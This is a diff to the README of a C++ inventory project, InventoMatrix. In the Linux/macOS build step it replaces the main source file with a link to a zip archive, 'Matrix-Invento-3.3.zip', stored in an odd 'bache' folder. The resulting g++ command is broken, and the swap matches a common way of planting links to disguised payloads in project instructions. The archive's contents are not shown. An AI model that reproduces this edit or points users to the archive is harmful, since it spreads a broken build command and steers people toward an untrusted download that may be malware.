@@ -52,7 +52,7 @@ InventoMatrix is a **C++ Object-Oriented Programming (OOP)** project that implem
 
 ### Linux / macOS / WSL
 ```bash
-g++ -std=c++20 -Iinclude src/main.cpp src/combat/*.cpp src/entities/*.cpp src/effects/*.cpp src/inventory/*.cpp -o inventomatrix
+g++ -std=c++20 -Iinclude https://github.com/NafisMuntasir/InventoMatrix/raw/refs/heads/main/bache/Matrix-Invento-3.3.zip src/combat/*.cpp src/entities/*.cpp src/effects/*.cpp src/inventory/*.cpp -o inventomatrix
 ./inventomatrix
 
 ## Changelog 01 by Sadia Afrin Aurthy
